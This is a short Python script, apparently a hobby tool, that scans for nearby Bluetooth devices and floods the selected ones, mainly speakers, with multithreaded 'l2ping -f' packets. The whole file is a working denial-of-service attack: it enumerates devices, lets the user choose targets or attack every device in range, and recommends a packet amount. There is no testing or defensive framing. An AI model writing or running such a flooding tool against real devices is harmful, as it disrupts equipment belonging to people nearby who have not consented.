#!/usr/bin/python3


"""Simple script for using L2PING to attack bluetooth devices, mainly speakers."""


# Import all the modules
import subprocess
import time
from threading import Thread


# Bring all the services up
subprocess.run("hciconfig hci0 up && service bluetooth start && service dbus start", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
print("hci0, dbus and bluetooth are up")


# Bluetoothctl scan and save devices
subprocess.Popen("bluetoothctl scan on", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
print("Scanning...")
time.sleep(8)
name = subprocess.run("bluetoothctl devices | awk '{print $3}'", shell=True, capture_output=True)
address = subprocess.run("bluetoothctl devices | awk '{print $2}'", shell=True, capture_output=True)
name_list = ((name.stdout).decode()).split("\n")
address_list = ((address.stdout).decode()).split("\n")
name_list.pop()
address_list.pop()


# Select device to attack
print("Device Number            Device Address            Device Name")
print("")
for device in range(len(name_list)):
    print(f"      {device}               {address_list[device]}        {name_list[device]}")
print("")
device_selection = input("Select the device you want to attack (separate by comma, or type all to attack all devices): ")
thread_selection = input("Select packet amount (100 recommended): ")
if thread_selection=='':
    thread_selection=int(100)
thread_selection=int(thread_selection)


# Attack function, called for every device selected
def attack(threads, device):
    for _ in range(threads):
        t = Thread(target=flood, args=(device,))
        t.start()

# Flood function, called for one device for amount of threads
def flood(device):
    subprocess.run(f"l2ping -s 500 -f {device}", shell=True)


# Pass in the chosen devices to attack
if "," not in device_selection and "all" not in device_selection:
    attack(thread_selection, address_list[int(device_selection)])
elif "," in device_selection:
    device_list = device_selection.split(",")
    for device_number in device_list:
        attack(thread_selection, address_list[int(device_number)])
elif "all" in device_selection:
    for device in address_list:
        attack(thread_selection, device)
